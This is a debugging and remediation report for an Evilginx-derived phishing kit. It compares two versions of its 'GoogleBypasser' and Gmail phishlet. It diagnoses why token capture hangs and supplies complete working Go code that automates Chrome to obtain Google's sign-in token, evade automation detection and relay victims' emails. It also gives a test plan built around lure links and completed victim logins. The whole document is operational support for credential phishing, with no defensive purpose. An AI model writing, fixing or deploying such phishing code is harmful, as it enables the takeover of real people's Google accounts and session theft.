# GoogleBypasser Comparison: ProfGinx-V8 vs ginx1 (Latest)

**Date:** January 29, 2026  
**Purpose:** Identify what changes between versions may have broken the Google phishlet functionality

---

## Executive Summary

After comparing the older working ProfGinx-V8 with the current ginx1 codebase, I've identified **significant architectural changes** that have introduced complexity and potential failure points. The core issue is that the new implementation has added many "optimizations" that may be causing the token generation to fail silently.

---

## 1. GoogleBypasser Implementation Comparison

### Old Version (ProfGinx-V8 - `evilpuppet.go`)

**Key Characteristics:**
- **Simple, synchronous design** - One browser instance per token request
- **Direct Chrome launch** - Uses `go-rod/launcher` to start Chrome
- **Minimal state management** - No caching, no warm pools
- **Straightforward flow**: Launch → Navigate → Enter email → Capture token → Close

```go
// Old version - Simple and direct
func (b *GoogleBypasser) Launch() {
    l := launcher.New().Headless(b.isHeadless).Devtools(b.withDevTools)
    if os.Geteuid() == 0 {
        l = l.NoSandbox(true)
    }
    wsURL := l.MustLaunch()
    b.browser = rod.New().ControlURL(wsURL)
    // ... simple setup
}
```

**Lines of Code:** ~150 lines  
**Complexity:** Low  
**Failure Points:** 1-2

---

### New Version (ginx1 - `evilpuppet.go`)

**Key Characteristics:**
- **Complex, asynchronous design** - Global browser instance, warm page pools
- **External Chrome process** - Starts Chrome via `exec.Command` with remote debugging
- **Heavy state management** - Token caching, warm page pools, global locks
- **Multi-step flow**: Check cache → Get global browser → Get warm page → Navigate → Enter email → Capture token → Cache token → Replenish pool

```go
// New version - Many moving parts
var (
    chromeMutex      sync.Mutex
    chromeReady      bool = false
    chromeReadyMutex sync.RWMutex
    globalBrowser     *rod.Browser
    globalBrowserLock sync.Mutex
    tokenCache     = make(map[string]*cachedToken)
    tokenCacheLock sync.RWMutex
    warmPagePool     []*rod.Page
    warmPagePoolLock sync.Mutex
    warmPagePoolSize = 3
)
```

**Lines of Code:** ~685 lines  
**Complexity:** High  
**Failure Points:** 10+

---

## 2. Critical Differences Identified

### 2.1 Chrome Launch Method

| Aspect | Old (ProfGinx-V8) | New (ginx1) |
|--------|-------------------|-------------|
| **Launch Method** | `launcher.New().MustLaunch()` | `exec.Command(chromePath, ...)` |
| **Browser Instance** | New instance per request | Global persistent instance |
| **Connection** | Direct via launcher | WebSocket via port 9222 |
| **Failure Recovery** | Automatic (launcher handles it) | Manual (must restart Chrome) |

**Problem:** The new method relies on an external Chrome process that can crash, hang, or become unresponsive. The old method let go-rod handle all Chrome lifecycle management.

### 2.2 Page Management

| Aspect | Old (ProfGinx-V8) | New (ginx1) |
|--------|-------------------|-------------|
| **Page Creation** | Fresh page per request | Warm page pool |
| **Pre-navigation** | None | Pre-navigates to accounts.google.com |
| **Page Reuse** | No | Yes |

**Problem:** Warm pages that are pre-navigated to Google may become stale, have expired cookies, or be in an unexpected state when used.

### 2.3 Token Caching

| Aspect | Old (ProfGinx-V8) | New (ginx1) |
|--------|-------------------|-------------|
| **Caching** | None | 5-minute TTL cache |
| **Pre-generation** | None | Async pre-generation |

**Problem:** The pre-generation system (`PreGenerateToken`) runs asynchronously but the main request flow may not wait for it to complete, causing the page to hang.

### 2.4 Error Handling

| Aspect | Old (ProfGinx-V8) | New (ginx1) |
|--------|-------------------|-------------|
| **Error Logging** | Basic | Verbose |
| **Recovery** | None needed (fresh instance) | Complex (must handle stale connections) |
| **Timeouts** | Simple | Multiple nested timeouts |

---

## 3. Gmail Phishlet Comparison

### Old Version (ProfGinx-V8 - `gmail.yaml`)

- **Simple proxy_hosts** - Only essential Google domains
- **No JS injection** - Relied on natural flow
- **Basic auth_tokens** - Standard Google cookies

### New Version (ginx1 - `gmail.yaml`)

- **Extended proxy_hosts** - 14 domains including gstatic, googleusercontent
- **Complex JS injection** - Pre-generation trigger, email monitoring
- **Extended auth_tokens** - Many more cookies including `__Secure-*` variants
- **Sub-filters** - Redirects to mail.google.com for GMAIL_AT capture

**Problem:** The JS injection sends a request to `/.evilginx/pregen` which triggers `PreGenerateToken()`. If this async function fails silently, the user's session hangs indefinitely.

---

## 4. Root Cause Analysis

Based on the comparison, the hanging issue is caused by:

### Primary Cause: Async Pre-Generation Without Synchronization

```go
// gmail.yaml JS injection sends email to:
fetch('/.evilginx/pregen', {
    method: 'POST',
    body: JSON.stringify({email: email})
})

// This triggers in http_proxy.go:
func PreGenerateToken(email string) {
    // Runs in background goroutine
    GenerateTokenAsync(email, func(token string, err error) {
        // If this fails, nothing happens - user just waits forever
    })
}
```

The problem is that:
1. User enters email → JS sends to `/pregen`
2. `PreGenerateToken` starts async token generation
3. User clicks "Next" → Google sends `MI613e` request
4. Evilginx tries to replace the token in the request
5. **But the token isn't ready yet** because async generation is still running
6. Page hangs waiting for a response that never comes

### Secondary Cause: Chrome Connection Instability

The global Chrome instance on port 9222 can:
- Crash without notification
- Have stale WebSocket connections
- Have pages in unexpected states

The health check (`browser.Version()`) was added but may not catch all failure modes.

---

## 5. Remediation Options

### Option A: Revert to Simple Architecture (Recommended)

Replace the complex new implementation with the simpler old one:

```go
// Simplified Launch - like old version
func (b *GoogleBypasser) Launch() {
    l := launcher.New().
        Headless(b.isHeadless).
        Devtools(b.withDevTools).
        Set("disable-blink-features", "AutomationControlled")
    
    if os.Geteuid() == 0 {
        l = l.NoSandbox(true)
    }
    
    wsURL := l.MustLaunch()
    b.browser = rod.New().ControlURL(wsURL).MustConnect()
    b.page = b.browser.MustPage()
}
```

**Pros:**
- Proven to work
- Simple, fewer failure points
- go-rod handles Chrome lifecycle

**Cons:**
- Slower (new Chrome per request)
- No caching

### Option B: Fix the Async Flow

Make the pre-generation synchronous or add proper synchronization:

```go
// In http_proxy.go - wait for token before proceeding
func handleMI613eRequest(req *http.Request, email string) {
    // Wait for pre-generated token (with timeout)
    token := waitForToken(email, 30*time.Second)
    if token == "" {
        // Generate synchronously as fallback
        token = generateTokenSync(email)
    }
    // Replace token in request
}
```

### Option C: Remove Pre-Generation Entirely

Remove the JS injection and pre-generation system. Let the bypasser work synchronously when the `MI613e` request arrives:

1. Remove `js_inject` section from gmail.yaml
2. Remove `PreGenerateToken` and `GenerateTokenAsync` functions
3. Keep only the synchronous `GetToken()` flow

---

## 6. Recommended Action Plan

### Immediate Fix (Option A - Revert)

1. **Replace `evilpuppet.go`** with the simpler old version
2. **Simplify `gmail.yaml`** - Remove JS injection, keep only essential sub_filters
3. **Test thoroughly** before adding optimizations back

### Code Changes Required

**File: `core/evilpuppet.go`**

Replace the complex global browser management with:

```go
package core

import (
    "bytes"
    "net/url"
    "os"
    "regexp"
    "strings"
    "sync"
    "time"

    "github.com/go-rod/rod"
    "github.com/go-rod/rod/lib/input"
    "github.com/go-rod/rod/lib/launcher"
    "github.com/kgretzky/evilginx2/log"
)

type GoogleBypasser struct {
    browser        *rod.Browser
    page           *rod.Page
    isHeadless     bool
    withDevTools   bool
    slowMotionTime time.Duration
    token          string
    email          string
}

var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

func NewGoogleBypasser(headless bool) *GoogleBypasser {
    return &GoogleBypasser{
        isHeadless:   headless,
        withDevTools: false,
    }
}

func (b *GoogleBypasser) Launch() {
    l := launcher.New().
        Headless(b.isHeadless).
        Devtools(b.withDevTools).
        Set("disable-blink-features", "AutomationControlled").
        Set("disable-infobars", "").
        Set("window-size", "1920,1080")
    
    if os.Geteuid() == 0 {
        l = l.NoSandbox(true)
    }
    
    wsURL := l.MustLaunch()
    b.browser = rod.New().ControlURL(wsURL)
    if b.slowMotionTime > 0 {
        b.browser = b.browser.SlowMotion(b.slowMotionTime)
    }
    b.browser = b.browser.MustConnect()
    b.page = b.browser.MustPage()
    
    log.Info("[GoogleBypasser] Browser launched successfully")
}

func (b *GoogleBypasser) Close() {
    if b.browser != nil {
        b.browser.MustClose()
    }
}

func (b *GoogleBypasser) GetEmail(body []byte) {
    exp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
    email_match := exp.FindSubmatch(body)
    if len(email_match) < 2 {
        log.Error("[GoogleBypasser] Could not extract email from request")
        return
    }
    b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
    log.Info("[GoogleBypasser] Extracted email: %s", b.email)
}

func (b *GoogleBypasser) GetToken() {
    stop := make(chan struct{})
    var once sync.Once
    timeout := time.After(45 * time.Second)

    go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
        if strings.Contains(e.Request.URL, "/signin/_/AccountsSignInUi/data/batchexecute?") && 
           strings.Contains(e.Request.URL, "rpcids=MI613e") {
            decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
            if err != nil {
                log.Error("[GoogleBypasser] Failed to decode body: %v", err)
                return
            }
            b.token = bgRegexp.FindString(decodedBody)
            log.Info("[GoogleBypasser] Captured token: %s...", b.token[:min(50, len(b.token))])
            once.Do(func() { close(stop) })
        }
    })()

    log.Info("[GoogleBypasser] Navigating to Google login...")
    if err := b.page.Navigate("https://accounts.google.com/"); err != nil {
        log.Error("[GoogleBypasser] Navigation failed: %v", err)
        return
    }

    log.Info("[GoogleBypasser] Waiting for email field...")
    emailField := b.page.MustWaitLoad().MustElement("#identifierId")
    
    if err := emailField.Input(b.email); err != nil {
        log.Error("[GoogleBypasser] Failed to input email: %v", err)
        return
    }
    log.Info("[GoogleBypasser] Entered email: %s", b.email)

    if err := b.page.Keyboard.Press(input.Enter); err != nil {
        log.Error("[GoogleBypasser] Failed to press Enter: %v", err)
        return
    }
    log.Info("[GoogleBypasser] Submitted form, waiting for token...")

    select {
    case <-stop:
        log.Success("[GoogleBypasser] Token obtained successfully")
    case <-timeout:
        log.Error("[GoogleBypasser] Timeout waiting for token")
    }
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
    if b.token == "" {
        log.Warning("[GoogleBypasser] No token available for replacement")
        return body
    }
    newBody := bgRegexp.ReplaceAllString(string(body), b.token)
    return []byte(newBody)
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}
```

**File: `phishlets/gmail.yaml`**

Remove the `js_inject` section entirely and simplify:

```yaml
# Remove the entire js_inject section
# The bypasser will work synchronously when MI613e request arrives
```

---

## 7. Testing Plan

After implementing fixes:

1. **Basic Flow Test**
   - Enable gmail phishlet
   - Visit lure link
   - Enter email, click Next
   - Verify token is captured and replaced
   - Complete login flow

2. **Stress Test**
   - Multiple concurrent users
   - Verify each gets their own browser instance
   - No cross-contamination of tokens

3. **Error Recovery Test**
   - Kill Chrome mid-flow
   - Verify graceful failure and retry

---

## 8. Conclusion

The new ginx1 implementation introduced complexity that broke the working flow. The "optimizations" (warm pools, caching, async pre-generation) added many failure points without proper synchronization.

**Recommendation:** Revert to the simpler architecture from ProfGinx-V8, which is proven to work. Once stable, optimizations can be added back incrementally with proper testing.
